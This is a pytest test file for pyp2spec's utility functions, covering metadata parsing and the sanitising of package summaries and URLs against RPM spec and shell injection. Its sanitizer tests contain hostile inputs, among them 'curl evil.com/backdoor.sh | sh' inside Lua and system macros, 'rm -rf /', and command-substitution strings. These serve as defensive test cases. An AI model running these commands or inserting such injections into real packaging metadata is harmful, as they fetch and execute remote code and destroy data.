import pytest

from packaging.utils import canonicalize_name

from pyp2spec.utils import filter_license_classifiers, prepend_name_with_python
from pyp2spec.utils import get_extras, contains_wheel_with_abi_tag
from pyp2spec.utils import archive_name
from pyp2spec.utils import resolve_url, SdistNotFoundError
from pyp2spec.utils import create_compat_name, sanitize_input


def test_license_classifier_read_correctly():
    fake_pkg_data = [
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Operating System :: POSIX :: Linux",
        "License :: OSI Approved :: MIT License",
        "License :: OSI Approved :: MIT No Attribution License (MIT-0)",
        "Development Status :: 3 - Alpha",
    ]

    assert filter_license_classifiers(fake_pkg_data) == [
        "License :: OSI Approved :: MIT License",
        "License :: OSI Approved :: MIT No Attribution License (MIT-0)"
    ]


@pytest.mark.parametrize(
    ("pypi_name", "alt_version", "expected"), [
        ("foo", "3.10", "python3.10-foo"),
        ("python-foo", "3.9", "python3.9-foo"),
        ("python_foo", "3.12", "python3.12-foo"),
        ("foo", None, "python-foo"),
        ("python-foo", None, "python-foo"),
        ("python_foo", None, "python-foo"),
    ]
)
def test_python_name(pypi_name, alt_version, expected):
    assert prepend_name_with_python(canonicalize_name(pypi_name), alt_version) == expected


def test_extras_detected_correctly_from_requires_dist():
    requires_dist = [
        "foo ; platform_system == 'Windows'",
        "bar ; python_version < '3.8'",
        "baz",
        "foobar ; extra == 'docs'",
        "foobaz>=5.3.1",
        "spam>=3.5.0 ; extra == 'lint'",
        "ham[eggs]>=0.10; extra == 'test'",
        "eggs>=2.12; implementation_name != 'pypy' and extra == 'dev'",
    ]

    assert get_extras(None, requires_dist) == ["dev", "docs", "lint", "test"]


def test_extras_detected_correctly_from_provides_extra():
    provides_extra = ['docs', 'lint', 'dev', 'foo']
    requires_dist = [
        "foo ; platform_system == 'Windows'",
        "bar ; python_version < '3.8'",
        "baz",
        "foobar ; extra == 'docs'",
        "foobaz>=5.3.1",
        "spam>=3.5.0 ; extra == 'lint'",
        "ham[eggs]>=0.10; extra == 'test'",
        "eggs>=2.12; implementation_name != 'pypy' and extra == 'dev'",
    ]
    assert get_extras(provides_extra, requires_dist) == ["dev", "docs", "foo", "lint"]


def test_extras_detected_correctly_from_provides_extra_no_requires():
    provides_extra = ['docs', 'lint', 'dev', 'foo']
    # this is improbable, but let's be sure we read from the provides_extra without issues
    requires_dist = []
    assert get_extras(provides_extra, requires_dist) == ["dev", "docs", "foo", "lint"]


@pytest.mark.parametrize(
    ("wheel_name", "archful"), [
        ("sampleproject-3.0.0-py3-none-any.whl", False),
        ("numpy-1.26.0-cp39-cp39-win_amd64.whl", True),
        ("numpy-1.26.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", True),
        ("numpy-1.26.0-cp39-cp39-musllinux_1_1_x86_64.whl", True),
    ]
)
def test_archfulness_is_detected(wheel_name, archful):
    urls = [
        {
            "packagetype": "bdist_wheel",
            "filename": wheel_name,
        },
    ]
    assert contains_wheel_with_abi_tag(urls) is archful


def test_archfulness_is_detected_from_multiple_urls_1():
    urls = [
        {
            "packagetype": "sdist",
            "filename": "sampleproject-3.0.0.tar.gz",
        },
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-py3-none-any.whl",
        },
    ]
    assert not contains_wheel_with_abi_tag(urls)


def test_archfulness_is_detected_from_multiple_urls_2():
    urls = [
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-py3-none-any.whl",
        },
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-cp312-abi3-manylinux1_x86_64.whl",
        },
    ]
    assert contains_wheel_with_abi_tag(urls)



def test_archfulness_is_detected_from_multiple_urls_3():
    urls = [
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-cp312-abi3-manylinux1_x86_64.whl",
        },
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-cp39-cp39-win_amd64.whl",
        },
        {
            "packagetype": "bdist_wheel",
            "filename": "sampleproject-3.0.0-py3-none-any.whl",
        },
    ]
    assert contains_wheel_with_abi_tag(urls)


def test_archive_name_valid():
    archive_urls = [
        {
            "packagetype": "bdist_wheel",
            "filename": "example-1.0.0-py3-none-any.whl"
        },
        {
            "packagetype": "sdist",
            "filename": "example-1.0.0.tar.gz"
        },
    ]
    assert archive_name(archive_urls) == "example-1.0.0.tar.gz"


def test_archive_name_no_sdist():
    archive_urls = [
        {
            "packagetype": "bdist_wheel",
            "filename": "example-1.0.0-py3-none-any.whl"
        },
    ]
    with pytest.raises(SdistNotFoundError):
        archive_name(archive_urls)


def test_archive_name_empty_list():
    with pytest.raises(SdistNotFoundError):
        archive_name([])


def test_project_urls_valid_single():
    urls = {"homepage": "https://example.com"}
    assert resolve_url(urls) == "https://example.com"


def test_project_urls_valid_multiple():
    urls = {
        "homepage": "https://example.com",
        "documentation": "https://docs.example.com",
    }
    assert resolve_url(urls) == "https://example.com"


def test_project_urls_empty():
    assert resolve_url({}) == "..."


@pytest.mark.parametrize(
    ("name", "compat", "expected"), [
        ("my-package-foo", None, "my-package-foo"),
        ("my-package-foo", "3.5", "my-package-foo3.5"),
        ("my-package-foo2", None, "my-package-foo2"),
        ("my-package-foo2", "3.5", "my-package-foo2_3.5"),
    ]
)
def test_create_compat_name(name, compat, expected):
    assert create_compat_name(name, compat) == expected


@pytest.mark.parametrize(
    ("summary", "expected"), [
        ("A Python package", "A Python package"),
        ("Line 1\nLine 2", "Line 1 Line 2"),
        ("Package %(system curl evil.com|sh)", "Package"),
        ("Version %{version} package", "Version %%{version} package"),
        ("Good summary\n%prep\n%{system rm -rf /}", "Good summary %%prep %%{system rm -rf /}"),
        ("Text\x00with\x01control\x1fchars", "Textwithcontrolchars"),
        ("Python 包管理工具", "Python 包管理工具"),
    ]
)
def test_sanitize_summary(summary, expected):
    assert sanitize_input(summary) == expected


def test_sanitize_spec_injection_via_summary():
    attack = """Legitimate summary
%prep
%{lua: os.execute("curl evil.com/backdoor.sh | sh")}
"""
    result = sanitize_input(attack)
    assert "\n" not in result
    assert "%%prep" in result


@pytest.mark.parametrize(
    ("value", "desc"), [
        ("Package $(whoami)", "command substitution"),
        ("Tool `id`", "backticks"),
        ("Package | sh", "pipe"),
        ("Tool; rm -rf /", "semicolon"),
        ("Package && id", "double ampersand"),
        ("Tool & background", "ampersand"),
        ("Text >output.txt", "redirect"),
        ("Read <input.txt", "input redirect"),
        ("Exec (subshell)", "parentheses"),
        ("Array [0]", "square brackets"),
        ("Path \\escape", "backslash"),
        ("Quote 'test'", "single quotes"),
        ('Quote "test"', "double quotes"),
    ]
)
def test_sanitize_removes_shell_metacharacters(value, desc):
    result = sanitize_input(value)
    for char in ['$', '`', '|', ';', '&', '<', '>', '(', ')', '[', ']', '\\', "'", '"']:
        assert char not in result, f"Shell metacharacter {char!r} found in: {result}"


@pytest.mark.parametrize(
    ("url", "expected"), [
        ("https://example.com/pkg", "https://example.com/pkg"),
        ("http://evil.com%(system id)", "http://evil.com"),
        ("http://example.com\nBuildRequires: evil", "http://example.comBuildRequires:evil"),
        ("http://example .com/path with spaces", "http://example.com/pathwithspaces"),
        ("https://evil.com/%{buildroot}/etc/shadow", "https://evil.com/%%{buildroot}/etc/shadow"),
        # URL-specific characters that should be preserved
        ("https://github.com/issues?a=1&b=2", "https://github.com/issues?a=1&b=2"),
        ("https://en.wikipedia.org/wiki/Python_(lang)", "https://en.wikipedia.org/wiki/Python_(lang)"),
        ("https://example.com/path[123]", "https://example.com/path[123]"),
        ("https://example.com/search?q='test'", "https://example.com/search?q='test'"),
    ]
)
def test_sanitize_url_dangerous_content(url, expected):
    assert sanitize_input(url, url=True) == expected


def test_sanitize_multiple_macro_types():
    malicious = "Text %(system id) and %{version} and %%{safe}"
    result = sanitize_input(malicious)
    assert "%(system" not in result
    assert "%%{version}" in result
    assert "%%{safe}" in result
